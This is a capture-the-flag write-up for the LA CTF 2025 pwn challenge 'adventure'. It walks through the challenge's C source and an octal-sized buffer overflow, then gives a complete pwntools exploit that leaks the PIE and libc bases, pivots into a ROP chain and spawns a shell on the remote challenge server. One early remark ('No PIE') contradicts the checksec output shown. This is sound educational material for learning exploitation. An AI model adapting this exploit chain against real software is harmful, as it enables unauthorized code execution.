# Write up LA CTF 2025
## PWN
### adventure
#### overview
```shell
pwndbg> checksec
File:     /home/thefless/Documents/LACTF/adventure/chall_patched
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
pwndbg> 
```
- `No PIE`, maybe we can ROP.
```c
int main(void) {
    char input[INPUT_SIZE];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    print_banner();
    init_board();
    print_help();

    while (move_count < MAX_MOVES) {
        printf("> ");
        fflush(stdout);

        if (fgets(input, sizeof(input), stdin) == NULL) {
            break;
        }

        input[strcspn(input, "\n")] = 0;
        strncpy(history[move_count], input, INPUT_SIZE - 1);
        history[move_count][INPUT_SIZE - 1] = '\0';
        move_count++;

        if (strcmp(input, "n") == 0) {
            move_player(0, -1);
        } else if (strcmp(input, "s") == 0) {
            move_player(0, 1);
        } else if (strcmp(input, "e") == 0) {
            move_player(1, 0);
        } else if (strcmp(input, "w") == 0) {
            move_player(-1, 0);
        } else if (strcmp(input, "look") == 0) {
            look_around();
        } else if (strcmp(input, "inv") == 0) {
            print_inventory();
        } else if (strcmp(input, "grab") == 0) {
            grab_item();
        } else if (strcmp(input, "help") == 0) {
            print_help();
        } else if (strcmp(input, "quit") == 0) {
            puts("");
            puts("  You flee the dungeon in fear...");
            puts("  Perhaps another day, brave adventurer.");
            puts("");
            break;
        } else if (strlen(input) > 0) {
            puts("  Unknown command. Type 'help' for options.");
        }

        if (move_count % 25 == 0 && move_count < MAX_MOVES) {
            printf("  [%d moves remaining...]\n", MAX_MOVES - move_count);
        }
    }

    if (move_count >= MAX_MOVES) {
        puts("");
        puts("  ════════════════════════════════════");
        puts("  The dungeon's magic forces you out!");
        puts("  You have exhausted your journey...");
        puts("  ════════════════════════════════════");
        puts("");
    }

    return 0;
}
```
- `main` call `init_board` and print something.
- `fgets` read 7 bytes. That is moved into `history`. 
```c
void init_board(void) {
    memset(board, 0, sizeof(board));

    unsigned long addr = (unsigned long)main;
    unsigned char *bytes = (unsigned char *)&addr;

    for (int i = NUM_ITEMS - 1; i >= 0; i--) {
        int x = (bytes[i] >> 4) & 0x0F;
        int y = bytes[i] & 0x0F;

        while (board[y][x] != 0) {
            x = (x + 1) % BOARD_SIZE;
            if (x == 0) y = (y + 1) % BOARD_SIZE;
        }

        board[y][x] = i + 1;
    }
}
```
- `init_board` use `main` address to set up `board` in bss.
```c
void move_player(int dx, int dy) {
    int new_x = player_x + dx;
    int new_y = player_y + dy;

    if (new_x < 0 || new_x >= BOARD_SIZE || new_y < 0 || new_y >= BOARD_SIZE) {
        puts("  You bump into a cold stone wall.");
        return;
    }

    player_x = new_x;
    player_y = new_y;

    const char *directions[] = {"north", "south", "east", "west"};
    int dir_idx = (dy == -1) ? 0 : (dy == 1) ? 1 : (dx == 1) ? 2 : 3;
    printf("  You venture %s...\n", directions[dir_idx]);

    if (board[player_y][player_x] > 0) {
        int item_idx = board[player_y][player_x] - 1;
        printf("  You spot a %s here!\n", item_names[item_idx]);
    }
}
```
- In `move_player`, I know about item when i move into cell (need not to use "look").
```c
void print_inventory(void) {
    puts("");
    puts("  ╔═════════ INVENTORY ═════════╗");
    int item_count = 0;
    for (int i = 0; i < NUM_ITEMS; i++) {
        if (inventory[i]) {
            printf("  ║  [%c] %-22s ║\n", item_symbols[i], item_names[i]);
            item_count++;
        }
    }
    if (item_count == 0) {
        puts("  ║   (empty)                   ║");
    }
    puts("  ╠═════════════════════════════╣");
    printf("  ║  %2d,%2d %d/%d %3d/%3d %-6s   ║\n",
           player_x, player_y, item_count, NUM_ITEMS, move_count, MAX_MOVES, last_item);
    puts("  ╚═════════════════════════════╝");
    puts("");
}
```
- `print_inventory` have some `printf` (`%-6s` ~ `last_item`)
```c
void grab_item(void) {
    if (board[player_y][player_x] == 0) {
        puts("  There is nothing here to grab.");
        return;
    }

    int item_idx = board[player_y][player_x] - 1;
    printf("  You pick up the %s!\n", item_names[item_idx]);
    inventory[item_idx] = 1;
    board[player_y][player_x] = 0;
    last_item = item_names[item_idx];

    if (item_idx == 7) {
        check_flag_password();
    }
}
```
- `grab_item` call `check_flag_password` if `item_idx` is 7.
```c
void check_flag_password(void) {
    char password[0020];
    puts("");
    puts("  ╔═══════════════════════════════════════╗");
    puts("  ║  The sacred Flag pulses with power!   ║");
    puts("  ║  Speak the ancient password to        ║");
    puts("  ║  unlock its secrets...                ║");
    puts("  ╚═══════════════════════════════════════╝");
    puts("");
    printf("  Password: ");
    fflush(stdout);

    if (fgets(password, 0x20, stdin) == NULL) {
        return;
    }
    password[strcspn(password, "\n")] = 0;

    if (strcmp(password, "easter_egg") == 0) {
        puts("");
        puts("  *** CONGRATULATIONS! ***");
        puts("  The Flag's magic flows through you!");
        puts("  You have conquered the dungeon!");
        puts("");
    } else {
        puts("");
        puts("  The Flag rejects your words...");
        puts("  But you keep it anyway.");
        puts("");
    }
}
```
- `check_flag_password` has buffer overflow in `password`(`char password[0020] ~ char password[16]`, 0020 is Oct number).
#### exploit
- I use query `n,s,e,w` move into cell of board to leak code base.
- I put gadget `pop rbp ; ret` and some fuction address use to leak libc base, ret2main, overwrite `board[0][0]` (call `check_flag_password` again) and `last_item`(leak libc base) .
    + `check_flag_password + 152` to overwrite `last_item`
    + `print_inventory` to leak libc base (print `last_item` that has been overwrite).
    + `main + 17` to input more query.
- I go to cell (0, 0) that has Flag item. Therefore, I `grab` to call `check_flag_password`. 
- I use buffer overflow in `check_flag_password`(first time) to overwrite `last_item`.
- I use buffer overflow in `check_flag_password`(second time) to overwrite `board[0][0]`.
- I get libc base by gadget in `history`.
- I put gadget `pop rdi ; ret`, "/bin/sh", `system`.
- I `grab` to call `check_flag_password` again. After, I use buffer overflow to return to ROP chain (spawn shell).
#### Proof of Concepts
```python
#!/usr/bin/python3
from pwn import *


# Edit these placeholders: ./binary ./libc.so.6 amd64
context.binary = exe = ELF("./chall_patched")
# context.log_level = 'info'
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")
context.arch = "amd64"


script = '''
b*check_flag_password+176
c
'''
# p = process(exe.path)
# p = gdb.debug(exe.path , gdbscript = script)
p = remote("chall.lac.tf" , port = 31337)
# pause()

def slog(name , addr): return success(": ".join([name , hex(addr)]))
def s(payload):
    sleep(1.5)
    p.send(payload)
def sl(payload):
    p.sendline(payload)
def sa(info , payload):
    p.sendafter(info , payload)
def sla(info , payload):
    p.sendlineafter(info , payload)
def ru(payload):
    return p.recvuntil(payload)
def rn(payload):
    return p.recvn(payload)
def rln():
    return p.recvline()

def mov(payload):
    sl(payload)



item_names = ["Sword", "Shield", "Potion", "Key", "Scroll", "Amulet", "Crown", "Flag"]
found_positions = {}
items_found = 0
cur_x, cur_y = 0, 0

ru(b'> ')
sl("look")
output = ru(b'> ')
if b"A glimmering" in output:
    for idx, name in enumerate(item_names):
        if name.encode() in output:
            found_positions[idx] = (0, 0)
            items_found += 1
for y in range(16):
    direction = "e" if y % 2 == 0 else "w"
    
    for _ in range(15):
        if direction == "e": cur_x += 1
        else: cur_x -= 1
        sl(direction)
        print(cur_x , cur_y)
        output = ru(b'> ')
        if b"You spot a" in output:
            for idx, name in enumerate(item_names):
                if name.encode() in output:
                    if idx not in found_positions:
                        found_positions[idx] = (cur_x, cur_y)
                        items_found += 1
                    break    
    if y < 15:
        sl("s")
        cur_y += 1
        output = ru(b'> ')
        if b"You spot a" in output:
            for idx, name in enumerate(item_names):
                if name.encode() in output:
                    if idx not in found_positions:
                        found_positions[idx] = (cur_x, cur_y)
                        items_found += 1
                        log.success(f"Tìm thấy {name} tại ({cur_x}, {cur_y}) - {items_found}/8")
                    break
def recover_main_addr(positions):
    sim_board = [[0 for _ in range(16)] for _ in range(16)]
    recovered_bytes = [0] * 8
    for i in range(7, -1, -1):
        if i not in positions:
            log.error(f"Thiếu tọa độ của vật phẩm index {i}!")
            return 0
            
        target_x, target_y = positions[i]
        found_byte = False
        for val in range(256):
            v4_orig = (val >> 4) & 0xF
            v3_orig = val & 0xF
            curr_v4 = v4_orig
            curr_v3 = v3_orig
            while sim_board[curr_v3][curr_v4] != 0:
                curr_v4 = (curr_v4 + 1) % 16
                if curr_v4 == 0:
                    curr_v3 = (curr_v3 + 1) % 16
            if curr_v4 == target_x and curr_v3 == target_y:
                recovered_bytes[i] = val
                sim_board[curr_v3][curr_v4] = i + 1
                found_byte = True
                break
        
        if not found_byte:
            log.warning(f"Không tìm thấy byte gốc cho item {i} tại ({target_x}, {target_y})")
    addr = u64(bytes(recovered_bytes))
    return addr

addr = recover_main_addr(found_positions)
print(hex(addr))
exe.address = addr - exe.sym.main
bss = exe.address + 0x4300
ret = exe.address + 0x000000000000101a
leave_ret = exe.address + 0x00000000000014b7
last_item = exe.address + 0x4020
ROP = exe.address + 0x4910
board = exe.address + 0x4a20
puts_got = exe.address + 0x3f98
pop_rbp= exe.address + 0x0000000000001233
slog("code base" , exe.address)
_start = "n" * 15
for i in _start:
    mov(i)
    ru(b'> ')
s(p64(pop_rbp)[:-1])
ru(b'> ')
s(p64(last_item + 0x10)[:-1])
ru(b'> ')
s(p64(exe.sym.check_flag_password + 152)[:-1])
ru(b'> ')
s(p64(pop_rbp)[:-1])
ru(b'> ')
s(p64(board + 0x8)[:-1])
ru(b'> ')
s(p64(exe.sym.check_flag_password + 152)[:-1])
ru(b'> ')
s(p64(pop_rbp)[:-1])
ru(b'> ')
s(p64(bss + 0x920)[:-1])
ru(b'> ')
s(p64(exe.sym.print_inventory)[:-1])
ru(b'> ')
s(p64(pop_rbp)[:-1])
ru(b'> ')
s(p64(bss + 0xa20)[:-1])
ru(b'> ')
s(p64(exe.sym.main + 72)[:-1])
ru(b'> ')
sl(b'grab')
sa(b'Password: ' , b'A' * 0x10 + p64(ROP) + p64(leave_ret)[:-1])
# pause()
s(p64(puts_got) + p64(0) + p64(ROP + 0x18) + p64(leave_ret)[:-1])
# pause()
s(p64(0) + p64(8) + p64(ROP + 0x30) + p64(leave_ret)[:-1])
ru(b'/300 ')
libc.address = u64(rn(6) + b'\x00' * 2) - libc.sym.puts
slog("libc base" , libc.address)
# in libc
pop_rdi = libc.address + 0x000000000010f78b
binsh = next(libc.search("/bin/sh"))
system = libc.sym.system
ru(b'> ')
s(p64(pop_rdi)[:-1])
ru(b'> ')
s(p64(binsh)[:-1])
ru(b'> ')
s(p64(system)[:-1])
ru(b'> ')
sl(b'grab')
sa(b'Password: ' , b'A' * 0x10 + p64(ROP + 0x58 + 0x10) + p64(leave_ret)[:-1])
sl(b"cat flag.txt")
p.interactive()
```